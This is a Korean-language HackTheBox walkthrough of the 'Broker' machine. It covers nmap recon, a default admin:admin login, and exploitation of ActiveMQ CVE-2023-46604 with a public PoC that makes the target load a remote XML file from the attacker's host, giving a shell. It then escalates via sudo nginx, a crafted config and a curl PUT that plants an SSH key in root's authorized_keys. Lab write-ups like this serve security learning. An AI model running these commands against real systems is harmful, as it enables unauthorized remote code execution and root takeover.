# Broker - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,1883,5672,8161,46159,61613,61614,61616 -sC -sV -vv -oA broker 10.10.11.243
```
<img width="1103" height="483" alt="image" src="https://github.com/user-attachments/assets/21521d57-91fb-4a6e-a45e-360d4dde3a11" />
<img width="1103" height="536" alt="image" src="https://github.com/user-attachments/assets/2cc81f0a-a2f6-4e8c-91e0-bb2cc69f5ce5" />

- SSH(22)
- HTTP(80)
- HTTP(8161)
- ActiveMQ(61613)
- HTTP(61614)

---
## HTTP
- `admin:admin`으로 로그인 시도하여 성공.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/55285564-6c28-4cd4-932d-0057c618a9ad" />

<br>
<br>

- `ActiveMQ 5.15.15` : 서버와 클라이언트 사이에서 메세지를 저장하고 전송하는 역할.
<img width="668" height="482" alt="image" src="https://github.com/user-attachments/assets/b37bd411-eed6-4122-99cb-fa53ac47e0fa" />

### CVE-2023-46604
- https://nvd.nist.gov/vuln/detail/CVE-2023-46604
- `Openwire Protocol`의 역직렬화 과정의 취약점을 이용.
<img width="1239" height="221" alt="image" src="https://github.com/user-attachments/assets/df433cc9-359a-4566-b172-cba8fb93e498" />

<br>
<br>

- https://github.com/rootsecdev/CVE-2023-46604/blob/main/main.go
- 스크립트를 완전히 이해하지는 못했으나 `ClassPathXmlApplicationContext`를 통해 원격 XML 설정 파일을 로드하여 명령어 실행을 확인.
<img width="1239" height="406" alt="image" src="https://github.com/user-attachments/assets/ef569abe-d1a8-446a-9f05-5bf740193d8a" />

<br>
<br>

- 서버가 리눅스를 사용중인 것을 `nmap`에서 확인하여 `poc-linux.xml`의 코드를 변경.
<img width="1102" height="337" alt="image" src="https://github.com/user-attachments/assets/d0cf466a-fe37-4110-bc4d-19d254e16198" />

<br>
<br>

- 스크립트 실행.
```bash
go run main.go -i 10.10.11.243 -u http://10.10.16.4/poc-linux.xml
```
<img width="1102" height="274" alt="image" src="https://github.com/user-attachments/assets/4fd5fb6a-86b7-4e5a-ab44-45f5a4f86baa" />

<br>
<br>

- 셸 획득.
<img width="1102" height="181" alt="image" src="https://github.com/user-attachments/assets/aa315b15-acdc-42d8-8ee3-211b2fb7564e" />

## Privesc
- `/usr/sbin/nginx`를 `root` 권한으로 실행시킬 수 있음.
```bash
sudo -l
```
<img width="1102" height="156" alt="image" src="https://github.com/user-attachments/assets/c38d582d-fcbd-44ce-bd90-c10c1146d7b6" />

<br>
<br>

- https://github.com/DylanGrl/nginx_sudo_privesc
- 임의로 생성한 `configuration`파일을 `root`권한으로 실행시킨 후에 SSH 연결을 가능하도록 만드는 코드.
<img width="795" height="661" alt="image" src="https://github.com/user-attachments/assets/51adcbb4-c9c9-4951-b61d-f477dddc29e1" />

<br>
<br>

 - `nginx.conf`생성.
<img width="1099" height="274" alt="image" src="https://github.com/user-attachments/assets/9ae0401f-cb98-4fc4-bbc8-0f9cb1adb6fd" />

<br>
<br>

- 스크립트의 순서대로 실행.
```bash
sudo /usr/sbin/nginx -c /tmp/nginx.conf

ssh-keygen

curl -X PUT localhost:1339/root/.ssh/authorized_keys -d "$(cat ~/.ssh/id_rsa.pub)" 
```
<img width="1099" height="461" alt="image" src="https://github.com/user-attachments/assets/fcef907f-4bc1-484e-acd4-3ca1b9d3ab46" />

<br>
<br>

- SSH로 `root`접속.
```bash
ssh root@localhost
```
<img width="1099" height="46" alt="image" src="https://github.com/user-attachments/assets/e2dbadf4-7dd8-4eab-a890-2752c2b3bd75" />

---
## FLAG
- `/home/activemq/user.txt`
<img width="1099" height="232" alt="image" src="https://github.com/user-attachments/assets/d25c84f5-1f1f-472d-89f3-56f629ebf140" />

<br>
<br>

- `/root/root.txt`
<img width="1099" height="251" alt="image" src="https://github.com/user-attachments/assets/f9019856-f288-4b69-80ac-180ac418ca21" />


